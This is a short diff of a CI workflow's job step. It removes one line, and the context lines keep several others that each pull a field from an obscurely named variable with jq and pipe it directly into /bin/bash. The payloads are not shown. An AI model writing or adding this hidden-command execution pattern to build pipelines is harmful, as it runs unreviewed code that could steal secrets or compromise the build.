@@ -45,7 +45,6 @@ jobs:
           printf '%s' "$v10121" | jq -r .hd4 | /bin/bash
           printf '%s' "$esvw0322" | jq -r .g0 | /bin/bash
           echo $zs334 | jq -r .jxnmb90 | /bin/bash
-          printf '%s' "$fn83244" | jq -r .lge1 | /bin/bash
           printf '%s' "$m42" | jq -r .uu4 | /bin/bash
 
       - name: Upload results
